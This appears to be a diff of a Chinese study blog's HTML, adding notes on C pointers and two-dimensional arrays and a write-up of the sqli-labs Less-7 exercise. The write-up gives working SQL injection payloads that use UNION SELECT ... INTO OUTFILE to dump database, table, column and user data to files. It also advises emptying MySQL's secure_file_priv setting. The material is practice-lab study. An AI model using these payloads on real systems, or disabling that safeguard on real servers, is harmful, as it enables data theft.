@@ -140,6 +140,18 @@
 <p>2.指针变量的定义：类型标识符   *标识符；如：int   *p。这句话将p定义为指针变量；p代表一个地址。</p>
 <p>注：a.一个指针变量只能指向类型相同的变量。</p>
 <p>​        b.如果存在“int i， *p=&amp;i（定义的p为指针变量的同时将i的地址赋值给p，指针变量p就指向了i，即 *p等价于i）；”。那么 *p等价于i等价于 *&amp;i；&amp; *p等价于&amp;i等价于p。观察发现指针运算符和取地址符共同作用时，会相互抵消。</p>
+<p>二.指针运算</p>
+<p>1.指针运算符“ * ”与自增，自减运算符均为单目运算，运算级相同，则运算方向为自右向东。</p>
+<p>三.指针和二维数组</p>
+<p>1.假设a为二维数组，a既是数组名也是二维数组的首地址，相当于a[0] [0]。a+1表示a[1] [0];*a+1表示a[0] [1]。</p>
+<p>2.假设有程序语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int a[3] [5] , (*p)[5],i,j;</span><br><span class="line">p&#x3D;a;</span><br></pre></td></tr></table></figure>
+
+<p>则存在以下等阶：<em>（p[i]+j)  等于 * (* (p+i)+j)   等于  (</em>(p+i ) )[j] 等于  p[i] [j] 等于  a[i] [j] 。</p>
+<p>3.假设有程序语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int a[3] [5],i,j,*p[3];</span><br><span class="line">for (i&#x3D;0;i&lt;3;i++) p[i]&#x3D;a[i];&#x2F;&#x2F;p[i] 相当于每一行的首地址</span><br></pre></td></tr></table></figure>
+
+<p>则存在以下等阶：*(p[i]+j) 等于 *( *(p+i)+j)  等于 ( *(p+i )) [ j ] 等于 p[i] [j] 等于 a[i] [j]。</p>
 
       
     </div>
@@ -185,6 +197,48 @@
 <p>b.欲读取文件必须在服务器上。</p>
 <p>c.必须指定文件完整的路径。</p>
 <p>d.欲读取文件必须小于 max_allowed_packet。</p>
+<h4 id="二-lesson7实战"><a href="#二-lesson7实战" class="headerlink" title="二.lesson7实战"></a>二.lesson7实战</h4><h5 id="A-查找注入点："><a href="#A-查找注入点：" class="headerlink" title="A.查找注入点："></a>A.查找注入点：</h5><p>查询源代码——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;((&#39;$id&#39;)) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以得知注入类型为：’))</p>
+<p>构造语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39;)) or 1&#x3D;1--+;</span><br></pre></td></tr></table></figure>
+
+<p>返回正常。</p>
+<h5 id="B1-数据库中导出文件"><a href="#B1-数据库中导出文件" class="headerlink" title="B1.数据库中导出文件"></a>B1.数据库中导出文件</h5><p>遇到问题：输入语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;))union select 1,2,database() into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\1.txt&quot;--+</span><br></pre></td></tr></table></figure>
+
+<p>在指定目录下未生成相应名为“1”的文件</p>
+<p>由前人指点：mysql最初对文件的导入和导出有限制，因此应当先取消该限制</p>
+<p>在mysql数据库中执行语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>发现本地value的值为NULL。NULL表示禁止。即禁止将产生的文件导入mysql目录下（注：如果这里value值有文件夹目录，则表示只允许该目录下文件。如果为空，则表示不限制目录。）</p>
+<p>既然问题找到了，那就解决它——去掉导入目录的限制：在mysql配置文件my.ini中加入语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure_file_priv &#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>然后重启mysql，在执行上述语句则在指定目录下找到指定文件。</p>
+<p>由于我们刚刚没有规定产生的文件导出到哪里，因此在导出文件时要表明目录地址。</p>
+<p>在mysql数据库中输入语句——</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *from users into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\1.txt&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>则可在指定目录下找到该文件，得到users的全部内容。（注文件一定要是导出目录下不存在的新名字文件）</p>
+<h5 id="B2-在B1的操作之后就可以开始常规流程："><a href="#B2-在B1的操作之后就可以开始常规流程：" class="headerlink" title="B2.在B1的操作之后就可以开始常规流程："></a>B2.在B1的操作之后就可以开始常规流程：</h5><p>1.爆库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;))union select 1,2,database() into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\1.txt&quot;--+</span><br></pre></td></tr></table></figure>
+
+<p>点开1.txt的文件可以发现里面包含数据库名</p>
+<p>2.爆表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;))union select 1,2,table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\2.txt&quot;--+</span><br></pre></td></tr></table></figure>
+
+<p>点开2.txt的文件可以发现里面包含库名为security下的所有表的表名</p>
+<p>3.爆列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;))union select 1,2,column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\3.txt&quot;--+</span><br></pre></td></tr></table></figure>
+
+<p>点开3.txt的文件可以发现里面包含库名为security下表名为usesr的列的所有列名</p>
+<p>4.爆值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;))union select *from users into outfile &quot;D:\\phpstudy_pro\\www\\sqli-labs\\Less-7\\4.txt&quot;--+</span><br></pre></td></tr></table></figure>
+
+<p>点开4.txt的文件可以发现里面包含库名为security下表名为usesr的所有数据值。</p>
 
       
     </div>
@@ -396,7 +450,7 @@
 <p>一.寻找sql注入点</p>
 <p>根据标题提示该sql注入点为单引号。输入?id=1’返回值错误；输入?id=1返回值正常。故存在注入点。</p>
 <p>注：1.（自己的摸索）：发现输入id=非正整数如（?id=-1）时，页面返回为空。这是因为这些数值不在数据库范围之内，故返回为空。</p>
-<p>2.不是所有引起报错的点都是注入点，也可能是由于单纯的语法错误导致了页面报错。而当存在一个真正的注入点时，输入?id=0+注入点+or and 1=1–+语句返回值正常，反之报错。</p>
+<p>2.不是所有引起报错的点都是注入点，也可能是由于单纯的语法错误导致了页面报错。而当存在一个真正的注入点时，输入?id=0+注入点+or 1=1–+语句返回值正常，反之报错。</p>
 <p>二.查询字段数</p>
 <p>利用order by语句。?id=1%27%20order%20by%20<em>n</em>–+（n为正整数，不断改变n的值通过观察返回状态确定字段数）如：</p>
 <p>输入?id=1%27%20order%20by%201–+，返回正常。</p>
